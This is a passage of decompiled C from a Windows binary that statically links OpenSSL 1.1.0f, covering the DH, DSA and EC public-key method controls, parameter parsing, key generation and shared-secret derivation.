        if ( (unsigned int)(a3 - 1) > 1 )
          return 4294967294i64;
        *(_BYTE *)(v4 + 36) = a3;
        result = 1i64;
        break;
      case 4103:
        *(_QWORD *)(v4 + 48) = a4;
        return 1i64;
      case 4104:
        *a4 = *(_QWORD *)(v4 + 48);
        return 1i64;
      case 4105:
        if ( a3 <= 0 )
          return 4294967294i64;
        *(_QWORD *)(v4 + 72) = a3;
        return 1i64;
      case 4106:
        *(_DWORD *)a4 = *(_DWORD *)(v4 + 72);
        return 1i64;
      case 4107:
        sub_14001D930(*(void **)(v4 + 56));
        *(_QWORD *)(v4 + 56) = a4;
        if ( a4 )
          *(_QWORD *)(v4 + 64) = v6;
        else
          *(_QWORD *)(v4 + 64) = 0i64;
        return 1i64;
      case 4108:
        *a4 = *(_QWORD *)(v4 + 56);
        return *(unsigned int *)(v4 + 64);
      case 4109:
        sub_14003F4D0(*(_QWORD *)(v4 + 40));
        result = 1i64;
        *(_QWORD *)(v4 + 40) = a4;
        return result;
      case 4110:
        *a4 = *(_QWORD *)(v4 + 40);
        return 1i64;
      default:
        return 4294967294i64;
    }
  }
  else
  {
    if ( a2 == 4097 )
    {
      if ( a3 >= 256 )
      {
        *(_DWORD *)v4 = a3;
        return 1i64;
      }
    }
    else if ( a2 == 2 )
    {
      return 1i64;
    }
    return 4294967294i64;
  }
  return result;
}

//----- (0000000140036B70) ----------------------------------------------------
__int64 __fastcall sub_140036B70(__int64 *a1, const char *a2, __int64 a3)
{
  unsigned int v6; // eax
  __int64 v8; // rbx
  unsigned int v9; // eax
  unsigned int v10; // eax
  unsigned int v11; // eax
  unsigned int v12; // eax

  if ( !strcmp(a2, "dh_paramgen_prime_len") )
  {
    v6 = sub_14000B3C8(a3);
    return sub_140020440(a1, 28, 2, 0x1001u, v6, 0i64);
  }
  if ( !strcmp(a2, "dh_rfc5114") )
  {
    v8 = a1[5];
    v9 = sub_14000B3C8(a3);
    if ( v9 <= 3 )
    {
      *(_DWORD *)(v8 + 24) = v9;
      return 1i64;
    }
  }
  else
  {
    if ( !strcmp(a2, "dh_paramgen_generator") )
    {
      v10 = sub_14000B3C8(a3);
      return sub_140020440(a1, 28, 2, 0x1002u, v10, 0i64);
    }
    if ( !strcmp(a2, "dh_paramgen_subprime_len") )
    {
      v11 = sub_14000B3C8(a3);
      return sub_140020440(a1, 28, 2, 0x1004u, v11, 0i64);
    }
    if ( !strcmp(a2, "dh_paramgen_type") )
    {
      v12 = sub_14000B3C8(a3);
      return sub_140020440(a1, 28, 2, 0x1005u, v12, 0i64);
    }
  }
  return 4294967294i64;
}

//----- (0000000140036D30) ----------------------------------------------------
__int64 __fastcall sub_140036D30(__int64 a1, __int64 a2)
{
  int *v2; // rsi
  int v5; // r8d
  int v6; // r8d
  int v7; // r8d
  _QWORD *v9; // rax
  void *v10; // rax
  void *v11; // rbx
  _QWORD *v12; // rdi
  __int64 v13; // rbx
  __int64 v14; // rax
  __int64 v15; // rdi
  unsigned int v16; // esi

  v2 = *(int **)(a1 + 40);
  v5 = v2[6];
  if ( !v5 )
  {
    if ( *(_QWORD *)(a1 + 56) )
    {
      v10 = sub_1400267B0();
      v11 = v10;
      if ( !v10 )
        return 0i64;
      sub_14001EDC0((__int64)v10, a1);
    }
    else
    {
      v11 = 0i64;
    }
    if ( v2[2] )
    {
      v12 = sub_1400370F0(v2, (__int64)v11);
      sub_140026780(v11);
      if ( v12 )
      {
        v13 = sub_14002D7C0(v12);
        sub_14002D940((__int64)v12);
        if ( v13 )
        {
          sub_14001D1A0(a2, 920, v13);
          return 1i64;
        }
      }
    }
    else
    {
      v14 = sub_14002D430();
      v15 = v14;
      if ( v14 )
      {
        v16 = sub_1400632E0(v14, *v2, v2[1], (__int64)v11);
        sub_140026780(v11);
        if ( v16 )
          sub_14001D1A0(a2, 28, v15);
        else
          sub_14002D310(v15);
        return v16;
      }
      sub_140026780(v11);
    }
    return 0i64;
  }
  v6 = v5 - 1;
  if ( v6 )
  {
    v7 = v6 - 1;
    if ( v7 )
    {
      if ( v7 != 1 )
        return 4294967294i64;
      v9 = sub_140063610();
    }
    else
    {
      v9 = sub_140063590();
    }
  }
  else
  {
    v9 = sub_140063510();
  }
  sub_14001D1A0(a2, 920, (__int64)v9);
  return 1i64;
}

//----- (0000000140036EA0) ----------------------------------------------------
__int64 __fastcall sub_140036EA0(__int64 a1, __int64 a2)
{
  int v2; // eax
  __int64 v6; // r8

  if ( !*(_QWORD *)(a1 + 16) )
  {
    sub_140024610(v2 - 43, v2 + 65, v2 + 59, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_pmeth.c", 364);
    return 0i64;
  }
  v6 = sub_14002D430();
  if ( !v6 )
    return 0i64;
  sub_14001D1A0(a2, **(_DWORD **)a1, v6);
  if ( !(unsigned int)sub_14001D290(a2, *(_QWORD *)(a1 + 16)) )
    return 0i64;
  return sub_14004FC60(*(_QWORD *)(a2 + 32));
}
// 140036ED2: variable 'v2' is possibly undefined

//----- (0000000140036F30) ----------------------------------------------------
__int64 __fastcall sub_140036F30(_QWORD *a1, char *a2, size_t *a3)
{
  __int64 v3; // r14
  __int64 v5; // rsi
  __int64 v7; // rax
  __int64 v8; // r14
  __int64 v9; // r12
  char v10; // al
  __int64 result; // rax
  size_t v12; // rax
  unsigned int v13; // ebx
  size_t v14; // r13
  char *v15; // rax
  char *v16; // r15

  v3 = a1[2];
  v5 = a1[5];
  if ( !v3 || (v7 = a1[3]) == 0 )
  {
    sub_140024610(5, 112, 108, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_pmeth.c", 385);
    return 0i64;
  }
  v8 = *(_QWORD *)(v3 + 32);
  v9 = *(_QWORD *)(*(_QWORD *)(v7 + 32) + 32i64);
  v10 = *(_BYTE *)(v5 + 36);
  if ( v10 == 1 )
  {
    if ( !a2 )
    {
      *a3 = (int)sub_14002D770(v8);
      return 1i64;
    }
    result = sub_14004FBA0((__int64)a2, v9, v8);
    if ( (int)result >= 0 )
    {
      *a3 = (int)result;
      return 1i64;
    }
  }
  else
  {
    if ( v10 != 2 )
      return 0i64;
    v12 = *(_QWORD *)(v5 + 72);
    if ( !v12 || !*(_QWORD *)(v5 + 40) )
      return 0i64;
    if ( !a2 )
    {
      *a3 = v12;
      return 1i64;
    }
    if ( *a3 != v12 )
      return 0i64;
    v13 = 0;
    v14 = (int)sub_14002D770(v8);
    v15 = (char *)sub_14001D8E0(v14);
    v16 = v15;
    if ( v15 && (int)sub_14004FBC0(v15, v9, v8) > 0 )
    {
      if ( (unsigned int)sub_140063690(
                           a2,
                           *a3,
                           v16,
                           (char *)v14,
                           *(_QWORD *)(v5 + 40),
                           *(_QWORD *)(v5 + 56),
                           *(_QWORD *)(v5 + 64),
                           *(int **)(v5 + 48)) )
      {
        v13 = 1;
        *a3 = *(_QWORD *)(v5 + 72);
      }
    }
    sub_14001DA40(v16, v14, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_pmeth.c", 0x1ACu);
    return v13;
  }
  return result;
}

//----- (00000001400370F0) ----------------------------------------------------
_DWORD **__fastcall sub_1400370F0(int *a1, __int64 a2)
{
  unsigned __int64 v3; // r14
  int v5; // esi
  int *v6; // rbp
  _DWORD **v8; // rbx
  int *v9; // rax
  int v10; // eax
  int v11; // eax

  v3 = *a1;
  v5 = a1[3];
  v6 = (int *)*((_QWORD *)a1 + 2);
  if ( a1[2] > 2 )
    return 0i64;
  v8 = (_DWORD **)sub_14002DA60();
  if ( !v8 )
    return 0i64;
  if ( v5 == -1 )
  {
    v5 = 160;
    if ( (int)v3 >= 2048 )
      v5 = 256;
  }
  if ( !v6 )
  {
    if ( (int)v3 < 2048 )
      v9 = (int *)sub_14005BAC0();
    else
      v9 = (int *)sub_14005BAE0();
    v6 = v9;
  }
  v10 = a1[2];
  if ( v10 == 1 )
  {
    v11 = sub_140063AD0(v8, v3, v5, v6, 0i64, 0i64, 0i64, 0i64, 0i64, a2);
    goto LABEL_16;
  }
  if ( v10 == 2 )
  {
    v11 = sub_1400642D0((__int64)v8, v3, v5, v6, 0i64, 0i64, -1, 0i64, 0i64, 0i64, a2);
LABEL_16:
    if ( v11 > 0 )
      return v8;
  }
  sub_14002D940((__int64)v8);
  return 0i64;
}

//----- (0000000140037230) ----------------------------------------------------
__int64 __fastcall sub_140037230(__int64 a1)
{
  unsigned int v1; // eax
  __int64 result; // rax

  result = (__int64)sub_14001D8E0(v1);
  if ( result )
  {
    *(_DWORD *)result = 1024;
    *(_QWORD *)(result + 8) = 0i64;
    *(_QWORD *)(result + 24) = 0i64;
    *(_DWORD *)(result + 4) = 160;
    *(_QWORD *)(a1 + 40) = result;
    *(_QWORD *)(a1 + 64) = result + 16;
    result = 1i64;
    *(_DWORD *)(a1 + 72) = 2;
  }
  return result;
}
// 140037246: variable 'v1' is possibly undefined

//----- (00000001400372A0) ----------------------------------------------------
__int64 __fastcall sub_1400372A0(__int64 a1, __int64 a2)
{
  unsigned int v2; // eax
  __int64 result; // rax
  __int64 v6; // rcx

  result = (__int64)sub_14001D8E0(v2);
  if ( result )
  {
    *(_DWORD *)result = 1024;
    *(_DWORD *)(result + 4) = 160;
    *(_QWORD *)(result + 8) = 0i64;
    *(_QWORD *)(result + 24) = 0i64;
    *(_QWORD *)(a1 + 40) = result;
    *(_QWORD *)(a1 + 64) = result + 16;
    *(_DWORD *)(a1 + 72) = 2;
    v6 = *(_QWORD *)(a2 + 40);
    *(_DWORD *)result = *(_DWORD *)v6;
    *(_DWORD *)(result + 4) = *(_DWORD *)(v6 + 4);
    *(_QWORD *)(result + 8) = *(_QWORD *)(v6 + 8);
    *(_QWORD *)(result + 24) = *(_QWORD *)(v6 + 24);
    return 1i64;
  }
  return result;
}
// 1400372C4: variable 'v2' is possibly undefined

//----- (0000000140037340) ----------------------------------------------------
void __fastcall sub_140037340(__int64 a1)
{
  sub_14001D930(*(void **)(a1 + 40));
}

//----- (0000000140037370) ----------------------------------------------------
__int64 __fastcall sub_140037370(__int64 a1, __int64 a2, _QWORD *a3, __int64 a4, __int64 a5)
{
  __int64 v8; // rbp
  __int64 v9; // rcx
  __int64 v10; // rcx
  unsigned int v11; // eax
  __int64 result; // rax
  unsigned int v13; // [rsp+40h] [rbp+8h] BYREF

  v8 = *(_QWORD *)(*(_QWORD *)(a1 + 16) + 32i64);
  v9 = *(_QWORD *)(*(_QWORD *)(a1 + 40) + 24i64);
  if ( v9 )
  {
    v10 = (int)sub_1400253D0(v9);
    v11 = a5;
    if ( a5 != v10 )
      return 0i64;
  }
  else
  {
    v11 = a5;
    if ( a5 != 20 )
      return 0i64;
  }
  result = sub_14005E980(0i64, a4, v11, a2, &v13, v8);
  if ( (int)result > 0 )
  {
    *a3 = v13;
    return 1i64;
  }
  return result;
}

//----- (0000000140037420) ----------------------------------------------------
__int64 __fastcall sub_140037420(__int64 a1, char *a2, unsigned int a3, __int64 a4, __int64 a5)
{
  __int64 v8; // rbp
  __int64 v9; // rcx
  __int64 v10; // rcx
  unsigned int v11; // eax

  v8 = *(_QWORD *)(*(_QWORD *)(a1 + 16) + 32i64);
  v9 = *(_QWORD *)(*(_QWORD *)(a1 + 40) + 24i64);
  if ( v9 )
  {
    v10 = (int)sub_1400253D0(v9);
    v11 = a5;
    if ( a5 != v10 )
      return 0i64;
  }
  else
  {
    v11 = a5;
    if ( a5 != 20 )
      return 0i64;
  }
  return sub_14005EA30(0i64, a4, v11, a2, a3, v8);
}

//----- (00000001400374B0) ----------------------------------------------------
__int64 __fastcall sub_1400374B0(__int64 a1, int a2, int a3, unsigned int *a4)
{
  __int64 v4; // rdi
  __int64 result; // rax
  int v7; // edx

  v4 = *(_QWORD *)(a1 + 40);
  if ( a2 > 4097 )
  {
    v7 = a2 - 4098;
    if ( v7 )
    {
      if ( v7 == 1 )
      {
        if ( (unsigned int)sub_14001D4F0(a4) == 64
          || (unsigned int)sub_14001D4F0(a4) == 675
          || (unsigned int)sub_14001D4F0(a4) == 672 )
        {
          *(_QWORD *)(v4 + 8) = a4;
          return 1i64;
        }
        else
        {
          sub_140024610(10, 120, 106, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_pmeth.c", 136);
          return 0i64;
        }
      }
    }
    else if ( a3 == 160 || a3 == 224 || !a3 || a3 == 256 )
    {
      *(_DWORD *)(v4 + 4) = a3;
      return 1i64;
    }
    return 4294967294i64;
  }
  if ( a2 == 4097 )
  {
    if ( a3 >= 256 )
    {
      *(_DWORD *)v4 = a3;
      return 1i64;
    }
    return 4294967294i64;
  }
  switch ( a2 )
  {
    case 1:
      if ( (unsigned int)sub_14001D4F0(a4) != 64
        && (unsigned int)sub_14001D4F0(a4) != 116
        && (unsigned int)sub_14001D4F0(a4) != 66
        && (unsigned int)sub_14001D4F0(a4) != 675
        && (unsigned int)sub_14001D4F0(a4) != 672
        && (unsigned int)sub_14001D4F0(a4) != 673
        && (unsigned int)sub_14001D4F0(a4) != 674 )
      {
        sub_140024610(10, 120, 106, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_pmeth.c", 150);
        return 0i64;
      }
      *(_QWORD *)(v4 + 24) = a4;
      result = 1i64;
      break;
    case 2:
      sub_140024610(10, 120, 150, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_pmeth.c", 167);
      return 4294967294i64;
    case 5:
    case 7:
    case 11:
      return 1i64;
    case 13:
      *(_QWORD *)a4 = *(_QWORD *)(v4 + 24);
      return 1i64;
    default:
      return 4294967294i64;
  }
  return result;
}

//----- (00000001400376D0) ----------------------------------------------------
__int64 __fastcall sub_1400376D0(__int64 *a1, const char *a2, __int64 a3)
{
  unsigned int v6; // eax
  unsigned int v8; // eax
  __int64 v9; // rax

  if ( !strcmp(a2, "dsa_paramgen_bits") )
  {
    v6 = sub_14000B3C8(a3);
    return sub_140020440(a1, 116, 2, 0x1001u, v6, 0i64);
  }
  else if ( !strcmp(a2, "dsa_paramgen_q_bits") )
  {
    v8 = sub_14000B3C8(a3);
    return sub_140020440(a1, 116, 2, 0x1002u, v8, 0i64);
  }
  else if ( !strcmp(a2, "dsa_paramgen_md") )
  {
    v9 = sub_14001E990(a3);
    return sub_140020440(a1, 116, 2, 0x1003u, 0, v9);
  }
  else
  {
    return 4294967294i64;
  }
}

//----- (0000000140037800) ----------------------------------------------------
__int64 __fastcall sub_140037800(__int64 a1, __int64 a2)
{
  int **v2; // rsi
  void *v5; // rax
  void *v6; // rbx
  _DWORD **v7; // rax
  __int64 v8; // rdi
  unsigned int v10; // esi

  v2 = *(int ***)(a1 + 40);
  if ( *(_QWORD *)(a1 + 56) )
  {
    v5 = sub_1400267B0();
    v6 = v5;
    if ( !v5 )
      return 0i64;
    sub_14001EDC0((__int64)v5, a1);
  }
  else
  {
    v6 = 0i64;
  }
  v7 = (_DWORD **)sub_14002DA60();
  v8 = (__int64)v7;
  if ( !v7 )
  {
    sub_140026780(v6);
    return 0i64;
  }
  v10 = sub_140063AD0(v7, *(int *)v2, *((int *)v2 + 1), v2[1], 0i64, 0i64, 0i64, 0i64, 0i64, (__int64)v6);
  sub_140026780(v6);
  if ( v10 )
    sub_14001D1A0(a2, 116, v8);
  else
    sub_14002D940(v8);
  return v10;
}

//----- (00000001400378F0) ----------------------------------------------------
__int64 __fastcall sub_1400378F0(__int64 a1, __int64 a2)
{
  int v2; // eax
  __int64 v6; // rax

  if ( !*(_QWORD *)(a1 + 16) )
  {
    sub_140024610(v2 - 38, v2 + 73, v2 + 59, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_pmeth.c", 229);
    return 0i64;
  }
  v6 = sub_14002DA60();
  if ( !v6 )
    return 0i64;
  sub_14001D1A0(a2, 116, v6);
  if ( !(unsigned int)sub_14001D290(a2, *(_QWORD *)(a1 + 16)) )
    return 0i64;
  return sub_140064DE0(*(_QWORD **)(a2 + 32));
}
// 140037922: variable 'v2' is possibly undefined

//----- (0000000140037980) ----------------------------------------------------
__int64 __fastcall sub_140037980(__int64 a1)
{
  int v1; // eax
  __int64 result; // rax

  result = (__int64)sub_14001DC20((unsigned int)(v1 + 32));
  if ( result )
  {
    *(_WORD *)(result + 24) = 511;
    *(_QWORD *)(a1 + 40) = result;
    return 1i64;
  }
  return result;
}
// 140037996: variable 'v1' is possibly undefined

//----- (00000001400379D0) ----------------------------------------------------
__int64 __fastcall sub_1400379D0(__int64 a1, __int64 a2)
{
  int v2; // eax
  _WORD *v5; // rax
  _WORD *v6; // rbx
  __int64 v7; // rdi
  __int64 *v8; // rax
  __int64 v9; // rcx
  __int64 v10; // rax
  const void *v11; // rcx
  void *v12; // rax

  v5 = sub_14001DC20((unsigned int)(v2 + 32));
  v6 = v5;
  if ( !v5 )
    return 0i64;
  v5[12] = 511;
  *(_QWORD *)(a1 + 40) = v5;
  v7 = *(_QWORD *)(a2 + 40);
  if ( *(_QWORD *)v7 )
  {
    v8 = sub_1400218A0(*(__int64 **)v7);
    *(_QWORD *)v6 = v8;
    if ( !v8 )
      return 0i64;
  }
  *((_QWORD *)v6 + 1) = *(_QWORD *)(v7 + 8);
  v9 = *(_QWORD *)(v7 + 16);
  if ( v9 )
  {
    v10 = sub_14001C5A0(v9);
    *((_QWORD *)v6 + 2) = v10;
    if ( !v10 )
      return 0i64;
  }
  *((_BYTE *)v6 + 25) = *(_BYTE *)(v7 + 25);
  *((_QWORD *)v6 + 4) = *(_QWORD *)(v7 + 32);
  *((_QWORD *)v6 + 7) = *(_QWORD *)(v7 + 56);
  v11 = *(const void **)(v7 + 40);
  if ( v11 )
  {
    v12 = sub_14003BAB0(v11, *(_QWORD *)(v7 + 48));
    *((_QWORD *)v6 + 5) = v12;
    if ( !v12 )
      return 0i64;
  }
  else
  {
    *((_QWORD *)v6 + 5) = 0i64;
  }
  *((_QWORD *)v6 + 6) = *(_QWORD *)(v7 + 48);
  return 1i64;
}
// 1400379F9: variable 'v2' is possibly undefined

//----- (0000000140037AD0) ----------------------------------------------------
void __fastcall sub_140037AD0(__int64 a1)
{
  __int64 v1; // rbx

  v1 = *(_QWORD *)(a1 + 40);
  if ( v1 )
  {
    sub_140021910(*(__int64 **)v1);
    sub_14001C600(*(_QWORD *)(v1 + 16));
    sub_14001D930(*(void **)(v1 + 40));
    sub_14001D930((void *)v1);
  }
}

//----- (0000000140037B30) ----------------------------------------------------
__int64 __fastcall sub_140037B30(__int64 a1, __int64 a2, _QWORD *a3, __int64 a4, unsigned int a5)
{
  __int64 v6; // rsi
  __int64 v9; // rdi
  __int64 result; // rax
  unsigned int *v11; // rcx
  unsigned int v12; // eax
  unsigned int v13; // [rsp+50h] [rbp+8h] BYREF

  v6 = *(_QWORD *)(a1 + 40);
  v9 = *(_QWORD *)(*(_QWORD *)(a1 + 16) + 32i64);
  if ( !a2 )
  {
    *a3 = (int)sub_1400653D0(v9);
    return 1i64;
  }
  if ( *a3 < (unsigned __int64)(int)sub_1400653D0(v9) )
  {
    sub_140024610(16, 218, 100, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_pmeth.c", 110);
    return 0i64;
  }
  v11 = *(unsigned int **)(v6 + 8);
  if ( v11 )
    v12 = sub_14001D4F0(v11);
  else
    v12 = 64;
  result = sub_140065190(v12, a4, a5, a2, (__int64)&v13, v9);
  if ( (int)result > 0 )
  {
    *a3 = v13;
    return 1i64;
  }
  return result;
}

//----- (0000000140037C10) ----------------------------------------------------
__int64 __fastcall sub_140037C10(__int64 a1, __int64 a2, int a3, __int64 a4, unsigned int a5)
{
  __int64 v8; // rbp
  unsigned int *v9; // rcx
  unsigned int v10; // eax

  v8 = *(_QWORD *)(*(_QWORD *)(a1 + 16) + 32i64);
  v9 = *(unsigned int **)(*(_QWORD *)(a1 + 40) + 8i64);
  if ( v9 )
    v10 = sub_14001D4F0(v9);
  else
    v10 = 64;
  return sub_140065250(v10, a4, a5, a2, a3, v8);
}

//----- (0000000140037C90) ----------------------------------------------------
__int64 __fastcall sub_140037C90(_QWORD *a1, void *a2, size_t *a3)
{
  __int64 v3; // rbx
  unsigned int v4; // r14d
  __int64 result; // rax
  size_t v9; // rax
  __int64 v10; // rax
  __int64 v11; // rcx
  __int64 v12; // rax
  void *v13; // r15
  int v14; // eax
  __int64 v15; // rdi
  size_t v16; // [rsp+60h] [rbp+8h] BYREF

  v3 = a1[5];
  v4 = 0;
  if ( *(_BYTE *)(v3 + 25) == 1 )
    return sub_140038640(a1, a2, a3);
  v9 = *(_QWORD *)(v3 + 56);
  if ( !a2 )
  {
    *a3 = v9;
    return 1i64;
  }
  if ( *a3 != v9 )
    return 0i64;
  v10 = a1[2];
  if ( !v10 || !a1[3] )
  {
    sub_140024610(16, 217, 140, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_pmeth.c", 155);
    return 0i64;
  }
  v11 = *(_QWORD *)(v3 + 16);
  if ( !v11 )
    v11 = *(_QWORD *)(v10 + 32);
  v12 = sub_14001C740(v11);
  v16 = (int)(sub_140021B10(v12) + 7) / 8;
  result = (__int64)sub_14001D8E0(v16);
  v13 = (void *)result;
  if ( result )
  {
    v14 = sub_140038640(a1, (void *)result, &v16);
    v15 = v16;
    if ( v14 )
    {
      if ( (unsigned int)sub_140064F40(
                           (char *)a2,
                           *a3,
                           (__int64)v13,
                           v16,
                           *(_QWORD *)(v3 + 40),
                           *(_QWORD *)(v3 + 48),
                           *(int **)(v3 + 32)) )
        v4 = 1;
    }
    sub_14001DA40(v13, v15, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_pmeth.c", 0xD4u);
    return v4;
  }
  return result;
}

//----- (0000000140037E00) ----------------------------------------------------
__int64 __fastcall sub_140037E00(__int64 a1, int a2, int a3, unsigned int *a4)
{
  __int64 v4; // rbx
  __int64 v6; // rdi
  __int64 result; // rax
  unsigned __int64 v8; // rdi
  char v9; // al
  __int64 v10; // rsi
  __int64 v11; // rcx
  __int64 v12; // rax
  __int64 v13; // rcx

  v4 = *(_QWORD *)(a1 + 40);
  v6 = a3;
  if ( a2 > 4097 )
  {
    switch ( a2 )
    {
      case 4098:
        if ( *(_QWORD *)v4 )
        {
          sub_140021D70(*(_QWORD *)v4, a3);
          result = 1i64;
        }
        else
        {
          sub_140024610(16, 197, 139, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_pmeth.c", 234);
          result = 0i64;
        }
        break;
      case 4099:
        if ( a3 == -2 )
        {
          v9 = *(_BYTE *)(v4 + 24);
          if ( v9 == -1 )
            result = ((unsigned int)sub_14001C790(*(_QWORD *)(*(_QWORD *)(a1 + 16) + 32i64)) >> 12) & 1;
          else
            result = (unsigned int)v9;
        }
        else
        {
          if ( (unsigned int)(a3 + 1) > 2 )
            goto LABEL_51;
          *(_BYTE *)(v4 + 24) = a3;
          if ( a3 == -1 )
          {
            sub_14001C600(*(_QWORD *)(v4 + 16));
            result = 1i64;
            *(_QWORD *)(v4 + 16) = 0i64;
          }
          else
          {
            v10 = *(_QWORD *)(*(_QWORD *)(a1 + 16) + 32i64);
            v11 = *(_QWORD *)(v10 + 24);
            if ( !v11 )
              goto LABEL_51;
            if ( sub_140027110(*(_QWORD *)(v11 + 24)) )
              return 1i64;
            if ( !*(_QWORD *)(v4 + 16) )
            {
              v12 = sub_14001C5A0(v10);
              *(_QWORD *)(v4 + 16) = v12;
              if ( !v12 )
                return 0i64;
            }
            v13 = *(_QWORD *)(v4 + 16);
            if ( (_DWORD)v6 )
              sub_14001CAE0(v13, 4096);
            else
              sub_14001C380(v13, 4096);
            result = 1i64;
          }
        }
        break;
      case 4100:
        if ( a3 == -2 )
        {
          result = (unsigned int)*(char *)(v4 + 25);
        }
        else
        {
          if ( (unsigned int)(a3 - 1) > 1 )
            goto LABEL_51;
          *(_BYTE *)(v4 + 25) = a3;
          result = 1i64;
        }
        break;
      case 4101:
        *(_QWORD *)(v4 + 32) = a4;
        result = 1i64;
        break;
      case 4102:
        *(_QWORD *)a4 = *(_QWORD *)(v4 + 32);
        result = 1i64;
        break;
      case 4103:
        if ( a3 <= 0 )
          goto LABEL_51;
        *(_QWORD *)(v4 + 56) = a3;
        result = 1i64;
        break;
      case 4104:
        *a4 = *(_DWORD *)(v4 + 56);
        result = 1i64;
        break;
      case 4105:
        sub_14001D930(*(void **)(v4 + 40));
        *(_QWORD *)(v4 + 40) = a4;
        if ( a4 )
          *(_QWORD *)(v4 + 48) = v6;
        else
          *(_QWORD *)(v4 + 48) = 0i64;
        result = 1i64;
        break;
      case 4106:
        *(_QWORD *)a4 = *(_QWORD *)(v4 + 40);
        result = *(unsigned int *)(v4 + 48);
        break;
      default:
LABEL_51:
        result = 4294967294i64;
        break;
    }
  }
  else if ( a2 == 4097 )
  {
    v8 = sub_140028760(a3);
    if ( v8 )
    {
      sub_140021910(*(__int64 **)v4);
      *(_QWORD *)v4 = v8;
      return 1i64;
    }
    else
    {
      sub_140024610(16, 197, 141, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_pmeth.c", 225);
      return 0i64;
    }
  }
  else
  {
    switch ( a2 )
    {
      case 1:
        if ( (unsigned int)sub_14001D4F0(a4) == 64
          || (unsigned int)sub_14001D4F0(a4) == 416
          || (unsigned int)sub_14001D4F0(a4) == 675
          || (unsigned int)sub_14001D4F0(a4) == 672
          || (unsigned int)sub_14001D4F0(a4) == 673
          || (unsigned int)sub_14001D4F0(a4) == 674 )
        {
          *(_QWORD *)(v4 + 8) = a4;
          result = 1i64;
        }
        else
        {
          sub_140024610(16, 197, 138, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_pmeth.c", 322);
          result = 0i64;
        }
        break;
      case 2:
      case 5:
      case 7:
      case 11:
        return 1i64;
      case 13:
        *(_QWORD *)a4 = *(_QWORD *)(v4 + 8);
        result = 1i64;
        break;
      default:
        goto LABEL_51;
    }
  }
  return result;
}

//----- (0000000140038290) ----------------------------------------------------
__int64 __fastcall sub_140038290(__int64 *a1, const char *a2, const char *a3)
{
  unsigned int v6; // eax
  unsigned int v8; // eax
  unsigned int v9; // r9d
  int v10; // r8d
  __int64 v11; // rax

  if ( strcmp(a2, "ec_paramgen_curve") )
  {
    if ( !strcmp(a2, "ec_param_enc") )
    {
      v8 = strcmp(a3, "explicit");
      if ( !v8 )
      {
        v9 = 4098;
        v10 = 6;
        return sub_140020440(a1, 408, v10, v9, v8, 0i64);
      }
      if ( !strcmp(a3, "named_curve") )
      {
        v8 = 1;
        v9 = 4098;
        v10 = 6;
        return sub_140020440(a1, 408, v10, v9, v8, 0i64);
      }
    }
    else
    {
      if ( !strcmp(a2, "ecdh_kdf_md") )
      {
        v11 = sub_14001E990((__int64)a3);
        if ( v11 )
          return sub_140020440(a1, 408, 1024, 0x1005u, 0, v11);
        sub_140024610(16, 198, 151, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_pmeth.c", 372);
        return 0i64;
      }
      if ( !strcmp(a2, "ecdh_cofactor_mode") )
      {
        v8 = sub_14000B3C8((__int64)a3);
        v9 = 4099;
        v10 = 1024;
        return sub_140020440(a1, 408, v10, v9, v8, 0i64);
      }
    }
    return 4294967294i64;
  }
  v6 = sub_140028860((__int64)a3);
  if ( v6 )
    return sub_140020440(a1, 408, 6, 0x1001u, v6, 0i64);
  v6 = sub_14002C720((__int64)a3);
  if ( v6 )
    return sub_140020440(a1, 408, 6, 0x1001u, v6, 0i64);
  v6 = sub_14002BF10((__int64)a3);
  if ( v6 )
    return sub_140020440(a1, 408, 6, 0x1001u, v6, 0i64);
  sub_140024610(16, 198, 141, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_pmeth.c", 356);
  return 0i64;
}

//----- (00000001400384B0) ----------------------------------------------------
__int64 **__fastcall sub_1400384B0(__int64 a1, __int64 a2)
{
  int v2; // eax
  __int64 **v3; // rdi
  __int64 **result; // rax
  __int64 v6; // rbx
  unsigned int v7; // edi

  v3 = *(__int64 ***)(a1 + 40);
  if ( *v3 )
  {
    result = (__int64 **)sub_14001C7F0();
    v6 = (__int64)result;
    if ( result )
    {
      v7 = sub_14001CAF0(result, *v3);
      if ( v7 )
      {
        sub_14001D1A0(a2, 408, v6);
        return (__int64 **)v7;
      }
      else
      {
        sub_14001C600(v6);
        return 0i64;
      }
    }
  }
  else
  {
    sub_140024610(v2 - 32, 219, v2 + 91, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_pmeth.c", 391);
    return 0i64;
  }
  return result;
}
// 1400384E4: variable 'v2' is possibly undefined

//----- (0000000140038570) ----------------------------------------------------
__int64 __fastcall sub_140038570(__int64 a1, __int64 a2)
{
  int v2; // eax
  __int64 **v4; // r14
  __int64 result; // rax
  __int64 v7; // rax
  __int64 **v8; // rbx
  __int64 v9; // rdx

  v4 = *(__int64 ***)(a1 + 40);
  if ( !*(_QWORD *)(a1 + 16) && !*v4 )
  {
    sub_140024610(v2 - 32, 199, v2 + 91, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_pmeth.c", 410);
    return 0i64;
  }
  v7 = sub_14001C7F0();
  v8 = (__int64 **)v7;
  if ( !v7 )
    return 0i64;
  sub_14001D1A0(a2, 408, v7);
  v9 = *(_QWORD *)(a1 + 16);
  if ( !v9 )
  {
    if ( (unsigned int)sub_14001CAF0(v8, *v4) )
      return sub_14001C6D0(*(_QWORD **)(a2 + 32));
    return 0i64;
  }
  result = sub_14001D290(a2, v9);
  if ( (_DWORD)result )
    return sub_14001C6D0(*(_QWORD **)(a2 + 32));
  return result;
}
// 1400385B4: variable 'v2' is possibly undefined

//----- (0000000140038640) ----------------------------------------------------
